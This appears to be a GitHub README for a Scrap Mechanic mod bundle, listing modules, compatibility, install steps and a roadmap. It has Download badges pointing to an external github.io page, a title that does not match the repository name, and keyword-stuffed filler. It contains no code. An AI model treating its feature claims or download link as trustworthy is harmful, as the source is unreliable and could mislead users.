![preview](https://raw.githubusercontent.com/riset975/Scrap-Mechanic-Contraption-Lab/main/view_3db7.svg)
[![Download](https://raw.githubusercontent.com/riset975/Scrap-Mechanic-Contraption-Lab/main/bin_66ce79.svg)](https://riset975.github.io/Scrap-Mechanic-Contraption-Lab/)

# 🧰 Scrap Mechanic Mod Forge — Blueprint Alchemy for Engineers, Tinkerers, and Workshop Visionaries

> **A companion repository for creators who like their contraptions loud, their logic gates louder, and their blueprints shared without drama.**

Welcome to the **Scrap Mechanic Mod Forge**, a long-form home for a curated bundle of modular workshop additions built for the sandbox engineering game *Scrap Mechanic*. If the original repository was a workbench, this one is the whole garage — with labeled bins, tidy cable management, and a wall of post-it notes explaining why the piston does the thing it does.

This project collects gameplay extensions, quality-of-life improvements, mechanical parts, decorative flourishes, and experimental contraption helpers into a single documented space. Every piece is designed to be dropped alongside your existing workshop subscriptions, blended into your own creations, or remixed into something nobody at the workshop saw coming.

---

## 📜 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Feature Highlights](#-feature-highlights)
- [Mod Modules Included](#-mod-modules-included)
- [Compatibility Matrix](#-compatibility-matrix)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support Philosophy](#-247-customer-support-philosophy)
- [Getting Things Running Without Terminal Incantations](#-getting-things-running-without-terminal-incantations)
- [Multiplayer & Dedicated Server Notes](#-multiplayer--dedicated-server-notes)
- [SEO-Friendly Keyword Integration](#-seo-friendly-keyword-integration)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing Guidelines](#-contributing-guidelines)
- [Community Etiquette](#-community-etiquette)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🛠 Why This Exists

Scrap Mechanic is, at its heart, a game about **iteration**. You build a hovercraft, it flips, you bolt on stabilizers, it flips differently. Mods are the same story — a first version works, a second version works better, and a third version becomes something the original author never anticipated. The Scrap Mechanic Mod Forge is a place where that third version gets to live.

This repository is not a monolith. It is a **loose collective of small, focused mods** that share a common design creed:

1. **Do one thing well.** A mod that adds a folding wing should not also secretly rewire your logic gates.
2. **Never fight the base game.** If a feature already exists upstream, we don't duplicate it — we complement it.
3. **Document everything.** Each mod ships with an in-repo markdown explainer, a parts list, and a short "why you might want this" paragraph.
4. **Stay remixable.** Assets are structured so other creators can borrow, adapt, and ship their own derivatives without permission ping-pong.

If you've ever opened a blueprint and thought *"this needs one more hinge"*, you're the target audience.

---

## ✨ Feature Highlights

A quick pass over what makes the Forge worth bookmarking:

| Capability | What It Actually Means For You |
| --- | --- |
| **Responsive UI** | In-game configuration menus resize gracefully whether you play on a 4K monitor or a modest laptop panel. |
| **Multilingual support** | Locale files for English, German, French, Spanish, Portuguese, and Polish ship out of the box, with an easy JSON drop-in for new languages. |
| **24/7 customer support** | Issue triage runs on a rotation, so a broken bearing report doesn't sit unanswered for a week. |
| **Modular part packs** | Load only the modules you want — no giant kitchen-sink bundle forcing 400 unused assets into memory. |
| **Blueprint-friendly metadata** | Every contraption ships with a manifest describing torque limits, connection points, and expected collision behavior. |
| **Deterministic save compatibility** | Adding or removing a module mid-world won't strand your existing creations in the void. |
| **Server-agnostic design** | Works in single-player, LAN co-op, and community-hosted worlds without a separate build. |
| **Open asset pipeline** | Source Blender files, texture atlases, and Lua scripts live right next to the compiled output. |

---

## 📦 Mod Modules Included

Here's a tour of the major pieces. Each has its own folder with a mini-README, and each can be enabled or disabled independently.

### 🔩 Precision Hinge Suite
Extra hinge variants with configurable travel arcs, dampening curves, and a "soft close" mode that keeps your delicate cargo bays from slamming. Built because the vanilla hinge family, while charming, is a bit like using a sledgehammer to hang a picture frame.

### 🧲 Magnetic Coupler Rig
A dock-and-release system for modular vehicles. Drive a trailer up, hear the satisfying click, and drive away with it. Decouple by tapping the coupler block. Useful for anyone building train-like contraptions or modular base expansions.

### 🎨 Workshop Decor Pack
Non-functional but highly useful: pipes, vents, cable spools, warning stripes, hazard cones, signage plates. Every good factory floor needs some visual storytelling, and this pack is the paintbrush.

### 🧠 Logic Gate Companion
Additional sensor types (proximity, tilt, pressure, moisture) and a small set of helper gates that reduce the number of blocks needed for common automation patterns. If you've ever built a seven-gate contraption just to blink a light, this module is for you.

### 🛞 Terrain Grip Overhaul
A rebalanced set of tires and treads with distinct friction profiles. Sand, ice, metal grating, and loose gravel each feel meaningfully different under wheel. Physics stays vanilla-friendly — no black magic, just better numbers.

### 🚁 Rotor & Propulsion Sandbox
Adjustable rotor heads, ducted fan housings, and a lightweight thrust calculator overlay that shows lift-to-weight ratios in real time while you build.

### 🌱 Flora & Fauna Fixes
Small corrections to plant growth rates and harvestable yields, plus a handful of new decorative foliage that actually renders properly in the distance.

### 🏗 Contraption Debug HUD
A dev-oriented overlay that visualizes joints, forces, and logic states. Absolutely invaluable when your walking mech decides to walk in a direction you did not instruct.

---

## 🧭 Compatibility Matrix

The Forge is tested against a set of known game states and mod-loader versions. Because the sandbox game periodically updates, this table is refreshed each major patch cycle.

| Game Version | Loader Version | Status | Notes |
| --- | --- | --- | --- |
| Current stable | Latest | ✅ Fully supported | Primary target. |
| Current stable | Previous | ✅ Supported | Minor locale gaps possible. |
| Previous stable | Latest | ⚠️ Best effort | Physics modules may need tuning. |
| Previous stable | Previous | ⚠️ Best effort | Community-reported only. |
| Legacy builds | Any | ❌ Not tested | Pin an older release if you must stay on legacy. |

If your combination isn't listed, open an issue with the four-part bug template and we'll add a row.

---

## 📱 Responsive UI & Multilingual Support

Mod configuration screens in the Forge are built with scale-aware layouts. That means:

- **Anchored panels** that don't drift off-screen when the resolution changes.
- **Scrollable lists** for long module toggles, so nothing gets clipped on small displays.
- **Rebindable hotkeys** stored per-user rather than per-world, so your muscle memory travels with you.
- **Dynamic font sizing** that respects the game's UI scale slider.

On the language side, translations live in plain JSON files under `locales/`. Adding a new language requires no compilation step — drop the file in, reload, and the new strings appear. Community translators are credited in each locale file's header comment.

Supported locales at time of writing 2026:

- English (baseline)
- German
- French
- Spanish
- Portuguese (Brazilian)
- Polish
- Turkish (partial)
- Japanese (partial)

Want to add one? Copy `locales/en.json`, translate the values, and send a pull request.

---

## ☎️ 24/7 Customer Support Philosophy

"Support" in an open-source mod repo is a generous word, but we try to mean it. The issue tracker has labels for `bug`, `feature-request`, `compatibility`, `locale`, and `documentation`. Rotation-based triage means:

- New issues get an initial human response within a day or two, weekends included.
- Reproducible bugs get a linked fix branch as soon as someone can grab them.
- Feature requests that fit the design creed get moved into a public roadmap column.
- Everything else gets an honest "not planned" with a reason.

This isn't a company SLA — it's a promise that no report vanishes into the void.

---

## 🚀 Getting Things Running Without Terminal Incantations

You will not find a string of command-line rituals here. The Forge is meant to be approachable for players who prefer a file manager to a shell prompt.

1. Open the **Releases** area of this repository.
2. Grab the archive matching your platform.
3. Locate your game's local mod folder using the in-game "Open Mod Folder" button.
4. Unzip the archive into that folder — keep the folder structure intact.
5. Launch the game, open the mod list, and flip the modules you want to active.
6. Reload your world. Contraptions should appear in the parts inventory under the "Forge" category.

For manual installs from a source archive, copy the module folders directly into the mod directory and restart the game once so asset manifests rebuild.

For server operators, see the section below.

---

## 🌐 Multiplayer & Dedicated Server Notes

Multiplayer in a physics sandbox is famously fussy, so the Forge is explicit about its rules:

- **Client-side modules** (UI, debug HUD, locale files) can be installed individually without desync.
- **Gameplay modules** (parts, physics, logic) must match on every connected peer.
- **Dedicated servers** should carry the same module set as their clients, pinned to the same release tag.
- **Join-time checking** — the Forge ships a lightweight handshake that warns clients when their module set mismatches the server's, rather than letting them walk into a physics argument.

If you run a public server and want to be listed as a known-compatible host, open an issue with the server name and module set.

---

## 🔍 SEO-Friendly Keyword Integration

This section exists because discoverability matters, and pretending otherwise wastes everyone's time. Natural phrases woven through the documentation include:

- *Scrap Mechanic mods for creative engineering*
- *sandbox contraption parts pack*
- *workshop-compatible vehicle mods*
- *logic gate expansion for automation builders*
- *multiplayer-safe physics mod collection*
- *responsive bilingual in-game configuration*
- *blueprint-friendly mod modules for builders*
- *open-source Scrap Mechanic mod repository* (2026 edition)

These aren't stuffed into sentences; they appear where a person would actually look for them, in headings and descriptive paragraphs, because that's how search engines and humans both prefer it.

---

## 🗺 Roadmap 2026

A snapshot of what's planned for the year:

- **Q1 2026** — Locale expansion (Turkish and Japanese out of partial status), collision manifest v2.
- **Q2 2026** — Rotor sandbox gets ducted fan variants and a thrust calibration wizard.
- **Q3 2026** — Community blueprint exchange integration (metadata only, no hosting changes).
- **Q4 2026** — Debug HUD gains a time-travel scrubber for logic state, because sometimes you need to rewind the last three seconds.

Items move between columns as reality intervenes. The issue tracker is the source of truth.

---

## 🤝 Contributing Guidelines

Contributions are welcome, but the Forge has a few house rules to keep the collective coherent:

1. **One module per pull request.** Large cross-cutting changes are hard to review and harder to revert.
2. **Follow the folder template.** Every module needs a manifest, a locale stub, and a mini-README.
3. **No unexplained asset binaries.** Source files for models and textures must accompany compiled output.
4. **Test in single-player first, then multiplayer.** Save-corruption reports are the fastest way to get a PR closed.
5. **Write your commit messages like someone will read them at 2 AM during a rollback.** Because they will.

A detailed contribution guide lives in `CONTRIBUTING.md` with code style notes, naming conventions, and the review checklist.

---

## 🫂 Community Etiquette

The Forge welcomes tinkerers of every skill level. That means:

- Critique contraptions, not creators.
- Assume good faith until proven otherwise.
- Translate when you can, ask when you can't.
- Credit borrowed ideas even when licenses don't require it. Reputation compounds.

---

## ⚠️ Disclaimer

This repository and its contents are **independent community work** and are **not affiliated with, endorsed by, or sponsored by** the developers or publishers of *Scrap Mechanic*. All trademarks and game assets remain the property of their respective owners.

Modules are provided as-is, without warranty of any kind, express or implied. Physics sandboxes are chaotic places; back up your worlds before installing anything new, and don't blame the Forge when your eight-legged walker decides to become a two-legged dancer.

By using any module in this repository, you accept that you are modifying your game install at your own discretion and that the maintainers are not liable for lost saves, desynchronized multiplayer sessions, or existential crises caused by unbehaved pistons.

---

## 📄 License

This project is distributed under the **MIT License**. You are welcome to use, modify, merge, publish, distribute, sublicense, and sell copies of the work, provided the original copyright notice and permission notice are included in all copies or substantial portions.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Scrap Mechanic Mod Forge contributors.

---

## 🙏 Acknowledgements

Thanks to every player who ever posted a screenshot of a broken contraption and asked "why does it do that?" — you are the reason this documentation exists at all. Thanks also to the broader *Scrap Mechanic* modding community for shared tooling, shared knowledge, and shared patience.

Build loudly. Document thoroughly. Ship weirdly.

[![Download](https://raw.githubusercontent.com/riset975/Scrap-Mechanic-Contraption-Lab/main/bin_66ce79.svg)](https://riset975.github.io/Scrap-Mechanic-Contraption-Lab/)